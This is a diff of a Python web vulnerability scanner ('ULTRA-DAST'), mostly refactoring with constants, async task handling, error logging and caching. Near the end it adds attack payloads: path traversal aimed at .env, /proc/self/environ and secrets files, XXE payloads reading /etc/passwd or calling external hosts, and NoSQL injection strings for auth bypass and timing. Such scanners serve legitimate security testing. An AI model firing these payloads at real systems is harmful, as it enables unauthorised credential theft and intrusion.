@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ULTRA-DAST v17.0 – The Unstoppable Pentester Platform
+ULTRA-DAST v17.3 – The Unstoppable Pentester Platform
 Full implementation with async engine, advanced evasion, second-order injection,
 race conditions, request smuggling, WebSocket/gRPC fuzzing, CVSS 4.0, Burp XML,
 JIRA/Slack alerts, multi‑tab GUI, proxy mode, FP learning, and more.
@@ -8,7 +8,6 @@ JIRA/Slack alerts, multi‑tab GUI, proxy mode, FP learning, and more.
 Install:
     pip install aiohttp beautifulsoup4 selenium pyyaml graphql-core pyjwt
     pip install dnspython html5lib websockets grpcio grpcio-reflection cvss PyQt5 reportlab
-    pip install python-interactsh
     ChromeDriver must be in PATH.
 
 Authorised use only. Unauthorised scanning is illegal.
@@ -98,6 +97,34 @@ GRAPHQL TESTING FEATURES:
 - Advanced batching attacks (nested batching, mixed operations, resource exhaustion)
 - Sophisticated alias attacks (circular references, combinatorial explosion, field duplication)
 - Comprehensive depth-bomb variations (deep nesting, circular fragments, directive abuse)
+
+ENHANCED SPA ROUTE DISCOVERY CONFIGURATION EXAMPLE:
+{
+    "spa_route_discovery_enabled": true,
+    "fsm_aware_testing_enabled": true
+}
+
+ENHANCED SPA ROUTE DISCOVERY FEATURES:
+- Framework Router Instrumentation: React Router, Angular Router, Vue Router detection and route table extraction
+- CDP Event Monitoring: Passive monitoring of History.pushState, replaceState, and popstate events
+- Lazy-loaded Route Detection: Automatic discovery of dynamically loaded routes in SPAs
+- Shadow DOM Route Discovery: Enhanced crawling of routes hidden in Web Components
+- Framework-specific hooks: JavaScript injection to dump route tables from framework globals
+
+STATE-MACHINE AWARE TESTING CONFIGURATION EXAMPLE:
+{
+    "fsm_aware_testing_enabled": true,
+    "business_logic_learning": true
+}
+
+STATE-MACHINE AWARE TESTING FEATURES:
+- Finite State Machine (FSM): Models business logic flows (browse → cart → checkout → payment → confirm)
+- State Detection: Automatic detection of application states from URLs and form data
+- Sequence Learning: Learns state sequences during crawling for intelligent testing
+- State-transition-aware Race Conditions: Tests race conditions only at optimal state transition points
+- High-value Flow Focus: Prioritizes testing at critical transitions (cart→checkout, payment→confirm)
+- FSM-informed Timing: Uses state-specific timing strategies (0ms, 10ms, 50ms, 100ms deltas)
+- Reduced False Positives: Eliminates inappropriate race condition testing through state awareness
 - GraphQL Batching IDOR (Alias Brute-force) for introspection-disabled endpoints
 - Configurable depth and batch limits for safe testing
 - Integration with existing vulnerability reporting system
@@ -182,7 +209,7 @@ IDS/IPS THROTTLING CONFIGURATION EXAMPLE:
         "enabled": true,
         "max_requests_per_second": 10,
         "burst_capacity": 20,
-        "min_requests_per_second": 0.1,
+        "min_requests_per_second": 0.1,  # Default minimum rate
         "max_requests_per_second": 100
     }
 }
@@ -381,7 +408,7 @@ DYNAMIC MUTATION SERVER FEATURES:
 """
 
 import asyncio
-import sys, os, json, re, time, uuid, base64, hashlib, threading, copy, random, statistics, logging, sqlite3
+import sys, os, json, re, time, uuid, base64, hashlib, threading, copy, random, statistics, logging, sqlite3, struct
 import ssl
 import ipaddress
 import binascii
@@ -402,11 +429,14 @@ from multiprocessing import Queue, Manager, Process
 import aiohttp
 import glob
 
-# Optional interactsh import with fallback
-# Note: interactsh packages have compatibility issues with Python 3.10.6
-# The code will use local OOB server as fallback
-INTERACTSH_AVAILABLE = False
-InteractshClient = None
+# Optional psutil import for process cleanup
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+    psutil = None
+    logging.debug("psutil library not available - advanced Chrome process cleanup will be limited")
 
 # Optional CVSS import with fallback
 try:
@@ -435,9 +465,206 @@ except ImportError:
     motor = None
     logging.warning("motor library not available - MongoDB scanning will be disabled")
 
+# ============================================================================
+# CONFIGURATION CONSTANTS
+# ============================================================================
+
+# Scanning defaults
+DEFAULT_DEPTH = 3
+DEFAULT_THREADS = 100
+DEFAULT_DELAY = 0.0
+
+# Network timeout constants
+DEFAULT_REQUEST_TIMEOUT = 30
+DEFAULT_CONNECT_TIMEOUT = 5
+DEFAULT_SOCK_READ_TIMEOUT = 10
+DEFAULT_HEALTH_CHECK_TIMEOUT = 5
+PROBE_TIMEOUT = 10
+EXTENDED_REQUEST_TIMEOUT = 15.0
+
+# Rate limiting constants
+VERIFICATION_RATE_LIMIT = 1  # Requests per second for verification
+DISCOVERY_RATE_LIMIT = 10  # Requests per second for discovery
+CIRCUIT_BREAKER_TIMEOUT = 300  # Seconds to wait after 429/503
+
+# Process and threading constants
+PROCESS_JOIN_TIMEOUT = 5
+TASK_QUEUE_TIMEOUT = 1
+RECURSION_LIMIT = 10000
+
+# Remote OS fingerprinting constants
+DEFAULT_TTL_ESTIMATE_LINUX = 64
+FAST_RESPONSE_THRESHOLD = 0.05  # seconds
+MODERATE_RESPONSE_THRESHOLD = 0.1  # seconds
+FAST_RESPONSE_CONFIDENCE = 0.4
+
+# Cache and storage constants
+DEFAULT_CACHE_MAX_SIZE = 1000
+DEFAULT_CACHE_TTL = 300
+
+# Regression oracle constants
+DEFAULT_BENIGN_SAMPLE_SIZE = 50
+DEFAULT_REGRESSION_RETRIES = 3
+DEFAULT_REGRESSION_DELAY = 1.0
+
+# Schema inference constants
+DEFAULT_INFERENCE_CONFIDENCE_THRESHOLD = 0.7
+DEFAULT_MAX_PROBES_PER_PARAMETER = 20
+
+# Mutation constants
+DEFAULT_MUTATION_INTENSITY = 0.8
+DEFAULT_MAX_MUTATIONS_PER_PARAMETER = 50
+
+# Proxy pool constants
+PROXY_ROTATION_INTERVAL = 100
+PROXY_HEALTH_CHECK_INTERVAL = 300
+PROXY_MAX_FAILURE_RATE = 0.5
+PROXY_FAILURE_TRACKING_WINDOW = 60
+PROXY_FAILURE_THRESHOLD = 0.8
+PROXY_STICKY_SESSION_DURATION = 600
+
+# Intelligent verification constants
+DEFAULT_CONFIDENCE_THRESHOLD = 95
+DEFAULT_GRAY_ZONE_THRESHOLD = 10
+DEFAULT_PROXIMITY_VALIDATION_SAMPLE_SIZE = 3
+
+# TCP/IP analysis constants
+TCP_INFO_STRUCTURE_SIZE = 92
+
 
 # Fix recursion crashes
-sys.setrecursionlimit(10000)
+sys.setrecursionlimit(RECURSION_LIMIT)
+
+# Central exception handling for async tasks
+class AsyncTaskManager:
+    """
+    Central exception handling mechanism for asyncio tasks.
+    Provides reliable exception handling and task tracking.
+    """
+    
+    def __init__(self):
+        self.background_tasks = set()
+        self._lock = asyncio.Lock()
+    
+    def create_task_sync(self, coro, task_name="unnamed", callback=None):
+        """
+        Create a background task with proper exception handling (synchronous wrapper).
+        This can be called from both sync and async contexts.
+        
+        Args:
+            coro: The coroutine to execute
+            task_name: Descriptive name for the task (for logging)
+            callback: Optional callback function(task) to call on completion
+        
+        Returns:
+            The created task object
+        """
+        async def wrapped_coro():
+            try:
+                return await coro
+            except Exception as e:
+                logging.error(f"Task '{task_name}' failed: {e}", exc_info=True)
+                raise  # Re-raise to ensure proper exception propagation
+        
+        task = asyncio.create_task(wrapped_coro())
+        
+        # Add proper exception handling callback
+        def handle_completion(t):
+            try:
+                if t.exception():
+                    logging.error(f"Task '{task_name}' exception: {t.exception()}", exc_info=True)
+                if callback:
+                    callback(t)
+            except Exception as e:
+                logging.error(f"Error in task completion callback for '{task_name}': {e}", exc_info=True)
+            finally:
+                # Clean up task from tracking set
+                asyncio.create_task(self._remove_task(task))
+        
+        task.add_done_callback(handle_completion)
+        
+        # Track the task (synchronously)
+        self.background_tasks.add(task)
+        
+        return task
+    
+    async def create_task(self, coro, task_name="unnamed", callback=None):
+        """
+        Create a background task with proper exception handling (async version).
+        
+        Args:
+            coro: The coroutine to execute
+            task_name: Descriptive name for the task (for logging)
+            callback: Optional callback function(task) to call on completion
+        
+        Returns:
+            The created task object
+        """
+        async def wrapped_coro():
+            try:
+                return await coro
+            except Exception as e:
+                logging.error(f"Task '{task_name}' failed: {e}", exc_info=True)
+                raise  # Re-raise to ensure proper exception propagation
+        
+        task = asyncio.create_task(wrapped_coro())
+        
+        # Add proper exception handling callback
+        def handle_completion(t):
+            try:
+                if t.exception():
+                    logging.error(f"Task '{task_name}' exception: {t.exception()}", exc_info=True)
+                if callback:
+                    callback(t)
+            except Exception as e:
+                logging.error(f"Error in task completion callback for '{task_name}': {e}", exc_info=True)
+            finally:
+                # Clean up task from tracking set
+                asyncio.create_task(self._remove_task(task))
+        
+        task.add_done_callback(handle_completion)
+        
+        # Track the task
+        async with self._lock:
+            self.background_tasks.add(task)
+        
+        return task
+    
+    async def _remove_task(self, task):
+        """Remove a completed task from tracking set"""
+        async with self._lock:
+            self.background_tasks.discard(task)
+    
+    async def wait_all(self, timeout=None):
+        """
+        Wait for all tracked background tasks to complete.
+        
+        Args:
+            timeout: Optional timeout in seconds
+        """
+        if not self.background_tasks:
+            return
+        
+        try:
+            await asyncio.wait_for(
+                asyncio.gather(*self.background_tasks, return_exceptions=True),
+                timeout=timeout
+            )
+        except asyncio.TimeoutError:
+            logging.warning(f"Timeout waiting for {len(self.background_tasks)} background tasks")
+        except Exception as e:
+            logging.error(f"Error waiting for background tasks: {e}", exc_info=True)
+    
+    async def cancel_all(self):
+        """Cancel all tracked background tasks"""
+        async with self._lock:
+            for task in self.background_tasks:
+                if not task.done():
+                    task.cancel()
+            self.background_tasks.clear()
+
+# Global async task manager instance
+async_task_manager = AsyncTaskManager()
 
 # PyQt5 imports for GUI components
 from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QFormLayout, 
@@ -473,7 +700,7 @@ class MultiprocessingScanner:
         
         while True:
             try:
-                task = task_queue.get(timeout=1)
+                task = task_queue.get(timeout=TASK_QUEUE_TIMEOUT)
                 if task is None:  # Poison pill
                     break
                     
@@ -514,7 +741,7 @@ class MultiprocessingScanner:
             
             async def scan():
                 async with aiohttp.ClientSession() as session:
-                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
+                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=DEFAULT_REQUEST_TIMEOUT)) as resp:
                         headers = dict(resp.headers)
                         content = await resp.text()
                         return {
@@ -528,9 +755,17 @@ class MultiprocessingScanner:
             result = loop.run_until_complete(scan())
             loop.close()
             return result
-            
+
         except Exception as e:
-            return {'url': url, 'error': str(e), 'success': False}
+            import traceback
+            return {
+                'url': url,
+                'error': str(e),
+                'success': False,
+                'exception_type': type(e).__name__,
+                'timestamp': datetime.now().isoformat(),
+                'stack_trace': traceback.format_exc()
+            }
     
     def _test_payload_worker(self, task_data):
         """Worker function for payload testing"""
@@ -547,7 +782,7 @@ class MultiprocessingScanner:
                 async with aiohttp.ClientSession() as session:
                     if method == 'GET':
                         async with session.get(url, params=payload, headers=headers, 
-                                             timeout=aiohttp.ClientTimeout(total=30)) as resp:
+                                             timeout=aiohttp.ClientTimeout(total=DEFAULT_REQUEST_TIMEOUT)) as resp:
                             content = await resp.text()
                             return {
                                 'url': url,
@@ -558,7 +793,7 @@ class MultiprocessingScanner:
                             }
                     else:
                         async with session.post(url, data=payload, headers=headers,
-                                              timeout=aiohttp.ClientTimeout(total=30)) as resp:
+                                              timeout=aiohttp.ClientTimeout(total=DEFAULT_REQUEST_TIMEOUT)) as resp:
                             content = await resp.text()
                             return {
                                 'url': url,
@@ -571,9 +806,18 @@ class MultiprocessingScanner:
             result = loop.run_until_complete(test())
             loop.close()
             return result
-            
+
         except Exception as e:
-            return {'url': url, 'payload': payload, 'error': str(e), 'success': False}
+            import traceback
+            return {
+                'url': url,
+                'payload': payload,
+                'error': str(e),
+                'success': False,
+                'exception_type': type(e).__name__,
+                'timestamp': datetime.now().isoformat(),
+                'stack_trace': traceback.format_exc()
+            }
     
     def _check_vulnerability_worker(self, task_data):
         """Worker function for vulnerability checking"""
@@ -587,7 +831,7 @@ class MultiprocessingScanner:
             
             async def check():
                 async with aiohttp.ClientSession() as session:
-                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
+                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=DEFAULT_REQUEST_TIMEOUT)) as resp:
                         content = await resp.text()
                         
                         vulnerabilities = []
@@ -609,9 +853,17 @@ class MultiprocessingScanner:
             result = loop.run_until_complete(check())
             loop.close()
             return result
-            
+
         except Exception as e:
-            return {'url': url, 'error': str(e), 'success': False}
+            import traceback
+            return {
+                'url': url,
+                'error': str(e),
+                'success': False,
+                'exception_type': type(e).__name__,
+                'timestamp': datetime.now().isoformat(),
+                'stack_trace': traceback.format_exc()
+            }
     
     def start_workers(self):
         """Start worker processes"""
@@ -654,7 +906,7 @@ class MultiprocessingScanner:
         
         # Wait for processes to finish
         for p in self.processes:
-            p.join(timeout=5)
+            p.join(timeout=PROCESS_JOIN_TIMEOUT)
             if p.is_alive():
                 p.terminate()
         
@@ -728,17 +980,28 @@ class RESTAPIServer:
                 'results': []
             }
             
-            # Start scan in background
-            asyncio.create_task(self.run_scan(task_id, target_url, config))
+            # Start scan in background with proper exception handling
+            task = async_task_manager.create_task_sync(
+                self.run_scan(task_id, target_url, config),
+                task_name=f"scan_{task_id}",
+                callback=lambda t: logging.info(f"Scan task {task_id} completed")
+            )
             
             return web.json_response({
                 'task_id': task_id,
                 'status': 'started',
                 'message': 'Scan started successfully'
             })
-            
+
         except Exception as e:
-            return web.json_response({'error': str(e)}, status=500)
+            import traceback
+            error_context = {
+                'error': str(e),
+                'exception_type': type(e).__name__,
+                'timestamp': datetime.now().isoformat(),
+                'stack_trace': traceback.format_exc()
+            }
+            return web.json_response(error_context, status=500)
     
     async def run_scan(self, task_id, target_url, config):
         """Run scan in background"""
@@ -795,10 +1058,14 @@ class RESTAPIServer:
                 self.scan_tasks[task_id]['error'] = 'Scanner not initialized - simulation mode'
             
         except Exception as e:
+            import traceback
             self.scan_tasks[task_id]['status'] = 'failed'
             self.scan_tasks[task_id]['end_time'] = datetime.now().isoformat()
             self.scan_tasks[task_id]['error'] = str(e)
-            logging.error(f"Scan failed for task {task_id}: {e}")
+            logging.error(f"Scan failed for task {task_id} (target: {target_url})\n"
+                         f"Exception Type: {type(e).__name__}\n"
+                         f"Error: {e}\n"
+                         f"Stack Trace:\n{traceback.format_exc()}")
     
     async def handle_get_scan_status(self, task_id):
         """Handle scan status request"""
@@ -852,7 +1119,14 @@ class RESTAPIServer:
                 self.scanner_instance.config = config
             return web.json_response({'status': 'updated'})
         except Exception as e:
-            return web.json_response({'error': str(e)}, status=500)
+            import traceback
+            error_context = {
+                'error': str(e),
+                'exception_type': type(e).__name__,
+                'timestamp': datetime.now().isoformat(),
+                'stack_trace': traceback.format_exc()
+            }
+            return web.json_response(error_context, status=500)
     
     async def start(self):
         """Start the REST API server"""
@@ -928,7 +1202,7 @@ class DeepOSFingerprinter:
     def __init__(self):
         self.fingerprint_cache = {}
         
-    async def fingerprint_host(self, host, port=80, timeout=5):
+    async def fingerprint_host(self, host, port=80, timeout=DEFAULT_HEALTH_CHECK_TIMEOUT):
         """
         Perform deep OS fingerprinting on a target host.
         
@@ -971,8 +1245,14 @@ class DeepOSFingerprinter:
             self.fingerprint_cache[cache_key] = results
             
         except Exception as e:
+            import traceback
             results['error'] = str(e)
-            logging.warning(f"OS fingerprinting failed for {host}: {e}")
+            error_details = f"OS fingerprinting failed for {host}:{port}\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error: {e}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+            error_details += f"Stack Trace:\n{traceback.format_exc()}"
+            logging.warning(error_details)
         
         return results
     
@@ -1121,7 +1401,13 @@ class DeepOSFingerprinter:
             tcp_data.update(http_data)
             
         except Exception as e:
-            logging.warning(f"TCP analysis failed: {e}")
+            import traceback
+            error_details = f"TCP analysis failed for {host}:{port}\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error: {e}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+            error_details += f"Stack Trace:\n{traceback.format_exc()}"
+            logging.warning(error_details)
             http_data = await self._analyze_http_headers(host, port, timeout)
             tcp_data.update(http_data)
         
@@ -1152,7 +1438,13 @@ class DeepOSFingerprinter:
                     http_data['ttl'] = self._estimate_ttl_from_timing(resp)
                     
         except Exception as e:
-            logging.warning(f"HTTP header analysis failed: {e}")
+            import traceback
+            error_details = f"HTTP header analysis failed for {host}:{port}\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error: {e}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+            error_details += f"Stack Trace:\n{traceback.format_exc()}"
+            logging.warning(error_details)
         
         return http_data
     
@@ -1183,13 +1475,13 @@ class DeepOSFingerprinter:
         confidence = 0.0
         
         # Fast response times typically indicate local or same-network systems
-        if timing < 0.05:
+        if timing < FAST_RESPONSE_THRESHOLD:
             # Very fast - likely local network or CDN
-            estimated_ttl = 64  # Linux/macOS common in modern infrastructure
-            confidence = 0.4
-        elif timing < 0.1:
+            estimated_ttl = DEFAULT_TTL_ESTIMATE_LINUX  # Linux/macOS common in modern infrastructure
+            confidence = FAST_RESPONSE_CONFIDENCE
+        elif timing < MODERATE_RESPONSE_THRESHOLD:
             # Fast - could be Linux/macOS
-            estimated_ttl = 64
+            estimated_ttl = DEFAULT_TTL_ESTIMATE_LINUX
             confidence = 0.5
         elif timing < 0.2:
             # Moderate - could be Windows
@@ -1198,7 +1490,7 @@ class DeepOSFingerprinter:
         elif timing < 0.5:
             # Slower - network devices or distant servers
             estimated_ttl = 255
-            confidence = 0.4
+            confidence = FAST_RESPONSE_CONFIDENCE
         else:
             # Very slow - network devices or distant
             estimated_ttl = 255
@@ -1344,7 +1636,13 @@ class CVETemplateEngine:
                     self.templates[cve_id] = template
                     logging.info(f"Loaded CVE template: {cve_id} from {template_file}")
             except Exception as e:
-                logging.error(f"Failed to load template {template_file}: {e}")
+                import traceback
+                error_details = f"Failed to load template {template_file}\n"
+                error_details += f"Exception Type: {type(e).__name__}\n"
+                error_details += f"Error: {e}\n"
+                error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+                error_details += f"Stack Trace:\n{traceback.format_exc()}"
+                logging.error(error_details)
                 
         logging.info(f"Loaded {len(self.templates)} CVE templates")
         
@@ -2103,6 +2401,11 @@ class VersionDetectionEngine:
         cves = []
         signatures = self.software_signatures.get(software_name, {})
         known_vulnerable = signatures.get('known_vulnerable_versions', {})
+        safe_versions = signatures.get('safe_versions', [])
+        
+        # Check if this version is in safe_versions (fix for issue #29)
+        if version in safe_versions:
+            return []  # No CVEs for safe versions
         
         # Check if this exact version is known to be vulnerable
         if version in known_vulnerable:
@@ -2229,6 +2532,13 @@ class VersionDetectionEngine:
         
         max_severity = max([cve.get('severity', 'LOW') for cve in cves])
         return max_severity
+
+    def close(self):
+        """Clean up resources to prevent resource leaks."""
+        # VersionDetectionEngine uses ephemeral resources and in-memory caches
+        # This method is provided for consistency with other cleanup patterns
+        self.version_cache.clear()
+        logging.info("VersionDetectionEngine: Resources cleaned up")
 
 
 class CVEFeedIntegration:
@@ -2480,8 +2790,14 @@ class BrowserAuthHelper:
             return auth_result
             
         except Exception as e:
-            logging.error(f"OAuth authentication failed: {e}")
-            return {'success': False, 'error': str(e)}
+            import traceback
+            error_details = f"OAuth authentication failed for {target_url}\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error: {e}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+            error_details += f"Stack Trace:\n{traceback.format_exc()}"
+            logging.error(error_details)
+            return {'success': False, 'error': str(e), 'exception_type': type(e).__name__}
             
         finally:
             if self.driver:
@@ -2705,8 +3021,14 @@ class InteractiveProxy:
                     )
                     
         except Exception as e:
-            logging.error(f"Proxy request failed: {e}")
-            return web.Response(text=f"Proxy error: {str(e)}", status=502)
+            import traceback
+            error_details = f"Proxy request failed for {method} {url}\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error: {e}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n"
+            error_details += f"Stack Trace:\n{traceback.format_exc()}"
+            logging.error(error_details)
+            return web.Response(text=f"Proxy error: {type(e).__name__} - {str(e)}", status=502)
     
     def _extract_target_url(self, request):
         """Extract target URL from proxy request"""
@@ -3141,7 +3463,13 @@ class AdvancedProxyTab(QWidget):
             self.status_label.setText("Proxy running on 127.0.0.1:8080")
             
         except Exception as e:
-            QMessageBox.critical(self, "Proxy Error", f"Failed to start proxy: {e}")
+            import traceback
+            error_details = f"Failed to start proxy on 127.0.0.1:8080\n\n"
+            error_details += f"Exception Type: {type(e).__name__}\n"
+            error_details += f"Error Message: {str(e)}\n"
+            error_details += f"Timestamp: {datetime.now().isoformat()}\n\n"
+            error_details += "Stack Trace:\n" + traceback.format_exc()
+            QMessageBox.critical(self, "Proxy Error", error_details)
     
     async def stop_proxy(self):
         """Stop the proxy server"""
@@ -3424,7 +3752,7 @@ class AdvancedProxyTab(QWidget):
         try:
             import requests
             
-            response = requests.request(method, url, headers=headers, json=body, timeout=30)
+            response = requests.request(method, url, headers=headers, json=body, timeout=DEFAULT_REQUEST_TIMEOUT)
             
             result = f"Status: {response.status_code}\n"
             result += f"Headers:\n{json.dumps(dict(response.headers), indent=2)}\n\n"
@@ -3568,34 +3896,136 @@ try:
 except ImportError:
     JWT_AVAILABLE = False
     pyjwt = None
+    logging.warning("PyJWT library not available - JWT testing will be disabled")
 
 try:
     import dns.resolver
     DNS_AVAILABLE = True
 except ImportError:
     DNS_AVAILABLE = False
+    logging.warning("dnspython library not available - DNS-based testing will be disabled")
 
 try:
     from graphql import build_client_schema, get_introspection_query, GraphQLSchema, is_input_type
     GRAPHQL_AVAILABLE = True
 except ImportError:
     GRAPHQL_AVAILABLE = False
+    logging.warning("graphql-core library not available - GraphQL testing will be disabled")
 
 try:
     import websockets
     WEBSOCKETS_AVAILABLE = True
 except ImportError:
     WEBSOCKETS_AVAILABLE = False
+    logging.warning("websockets library not available - WebSocket fuzzing will be disabled")
 
 try:
-    import grpcio as grpc
+    import grpc
     from grpc_reflection.v1alpha import reflection_pb2_grpc, reflection_pb2
     GRPC_AVAILABLE = True
 except ImportError:
     GRPC_AVAILABLE = False
+    logging.warning("grpc libraries not available - gRPC testing will be disabled")
 
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
+
+# ---------------------------------------------------------------------
+# BEAUTIFULSOUP CACHING
+# ---------------------------------------------------------------------
+class BeautifulSoupCache:
+    """
+    Thread-safe cache for BeautifulSoup objects to avoid redundant parsing.
+    Caches based on HTML content hash to handle identical content efficiently.
+    """
+    def __init__(self, max_size=1000):
+        self._cache = {}
+        self._max_size = max_size
+        self._lock = threading.Lock()
+        self._hits = 0
+        self._misses = 0
+    
+    def _get_hash(self, html_content: str) -> str:
+        """Generate a hash key for HTML content."""
+        return hashlib.md5(html_content.encode('utf-8')).hexdigest()
+    
+    def get(self, html_content: str, parser: str = 'html.parser') -> BeautifulSoup:
+        """
+        Get cached BeautifulSoup object or create new one if not cached.
+        
+        Args:
+            html_content: The HTML content to parse
+            parser: The parser to use (default: 'html.parser')
+            
+        Returns:
+            BeautifulSoup object
+        """
+        content_hash = self._get_hash(html_content)
+        cache_key = f"{content_hash}:{parser}"
+        
+        with self._lock:
+            if cache_key in self._cache:
+                self._hits += 1
+                return self._cache[cache_key]
+            
+            self._misses += 1
+            
+            # Create new BeautifulSoup object
+            soup = BeautifulSoup(html_content, parser)
+            
+            # Implement LRU eviction if cache is full
+            if len(self._cache) >= self._max_size:
+                # Remove oldest entry (first key)
+                oldest_key = next(iter(self._cache))
+                del self._cache[oldest_key]
+            
+            self._cache[cache_key] = soup
+            return soup
+    
+    def clear(self):
+        """Clear the cache."""
+        with self._lock:
+            self._cache.clear()
+            self._hits = 0
+            self._misses = 0
+    
+    def get_stats(self) -> dict:
+        """Get cache statistics."""
+        with self._lock:
+            total_requests = self._hits + self._misses
+            hit_rate = (self._hits / total_requests * 100) if total_requests > 0 else 0
+            return {
+                'size': len(self._cache),
+                'max_size': self._max_size,
+                'hits': self._hits,
+                'misses': self._misses,
+                'hit_rate': f"{hit_rate:.2f}%"
+            }
+
+# Global cache instance
+_bs4_cache = BeautifulSoupCache(max_size=1000)
+
+def get_cached_soup(html_content: str, parser: str = 'html.parser') -> BeautifulSoup:
+    """
+    Convenience function to get cached BeautifulSoup object.
+    
+    Args:
+        html_content: The HTML content to parse
+        parser: The parser to use (default: 'html.parser')
+        
+    Returns:
+        BeautifulSoup object
+    """
+    return _bs4_cache.get(html_content, parser)
+
+def clear_bs4_cache():
+    """Clear the global BeautifulSoup cache."""
+    _bs4_cache.clear()
+
+def get_bs4_cache_stats() -> dict:
+    """Get statistics for the global BeautifulSoup cache."""
+    return _bs4_cache.get_stats()
+
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
@@ -3685,21 +4115,6 @@ CWE_MAP = {
     "InsecureDeserialization": "CWE-502", "LogInjection": "CWE-117",
     "CSRF": "CWE-352", "JWT": "CWE-347", "CORS": "CWE-942", "GraphQL": "CWE-200",
     "RequestSmuggling": "CWE-444", "CL.0 Bypass": "CWE-444", "HTTP/2 Downgrade": "CWE-444", "HTTP/2 Protocol Confusion": "CWE-444",
-    # Local Privilege Escalation CWE mappings
-    "KernelVulnerability": "CWE-119", "WeakKernelConfiguration": "CWE-269",
-    "MisconfiguredService": "CWE-269", "ServiceRunningAsRoot": "CWE-269",
-    "WorldWritableServiceFiles": "CWE-732", "SystemdServiceRunningAsRoot": "CWE-269",
-    "PotentiallyDangerousSystemdCommand": "CWE-732", "PotentiallyRiskyWindowsService": "CWE-269",
-    "WeakFolderPermissions": "CWE-732", "ExploitableSUIDBinary": "CWE-269",
-    "SUIDBinaryFound": "CWE-269", "SGIDBinaryFound": "CWE-269",
-    "PotentiallyDangerousCronJob": "CWE-732", "WorldWritableCronFiles": "CWE-732",
-    "HighPrivilegeScheduledTasks": "CWE-269", "WorldWritableFilesInSensitiveDirectory": "CWE-732",
-    "WeakHomeDirectoryPermissions": "CWE-732", "WeakSSHDirectoryPermissions": "CWE-732",
-    "EveryoneHasFullAccess": "CWE-732", "WritableDirectoryInPATH": "CWE-426",
-    "BinaryInWritableLocation": "CWE-426", "CurrentDirectoryInPATH": "CWE-426",
-    "DangerousCapabilityAssigned": "CWE-269", "PrivilegedContainer": "CWE-269",
-    "HostFilesystemMounted": "CWE-269", "DockerSocketAccessible": "CWE-269",
-    "KubernetesServiceAccountToken": "CWE-269", "ServiceListeningOnAllInterfaces": "CWE-269",
     "WeakSSHConfiguration": "CWE-269", "PotentiallyVulnerableNetworkService": "CWE-269",
     "PotentiallyVulnerableWindowsService": "CWE-269", "SMBServerRunning": "CWE-269",
     "WeakPasswordPolicy": "CWE-521", "PotentialEmptyPasswords": "CWE-521",
@@ -3773,6 +4188,21 @@ PAYLOADS = {
         "../../.env",
         "../../application.properties",
         "/boot.ini",
+        # Modern Docker/container paths
+        "../../../../proc/version",
+        "../../../../proc/self/environ",
+        "../../../../app/application.yml",
+        "../../../../app/.env",
+        "../../../../etc/environment",
+        "../../../../.env",
+        "../../../../docker-compose.yml",
+        # Config file paths
+        "../../../../config/database.yml",
+        "../../../../config/secrets.yml",
+        "../../../../config/initializers/secret_token.rb",
+        # Windows specific
+        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "..\\..\\..\\..\\programdata\\.env",
     ],
     "CommandInjection": [
         ";id",
@@ -3811,6 +4241,13 @@ PAYLOADS = {
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         f'<!DOCTYPE replace [<!ENTITY % remote SYSTEM "http://{OOB_MARKER}"> %remote;]>',
         f'<!DOCTYPE replace [<!ENTITY % dtd SYSTEM "http://{OOB_MARKER}/evil.dtd"> %dtd;]>',
+        # Error-based XXE payloads (for blind XXE when OOB is blocked)
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://invalid-domain-12345.com">%xxe;]><foo></foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">%xxe;]><foo></foo>',
+        # Parameter entity-based error detection
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:9999">%xxe;]><foo/>',
     ],
     "CRLF": ["test%0d%0aSet-Cookie:crlf=injection"],
     "SSRF": [
@@ -3830,6 +4267,19 @@ PAYLOADS = {
         '{"$regex":".*"}',
         '{"$where": "1==1"}',
         '{"$or": [{"foo":"bar"},{"foo":"bar"}]}',
+        # JavaScript injection variants
+        '{"$where": "function() { return true; }"}',
+        '{"$where": "this.password == this.password"}',
+        '"; return true;//',
+        # Aggregation pipeline injection
+        '{"$project": {"$eq": [1, 1]}}',
+        '{"$lookup": {"from": "users", "pipeline": [{"$match": {"$expr": {"$eq": ["$admin", true]}}}], "as": "result"}}',
+        # Query syntax confusion
+        'username[$ne]=admin',
+        'password[$ne]=',
+        # Time-based detection
+        '{"$where": "sleep(1000)"}',
+        '{"$where": "function() { var d = new Date(); while(new Date() - d < 1000); return true; }"}',
     ],
     "LDAPi": [
         "*)(uid=*))(|(uid=*",
@@ -4005,7 +4455,8 @@ class HTMLContextParser:
         self.string_delimiter = None
         
         i = 0
-        payload_index = html.lower().find(payload.lower())
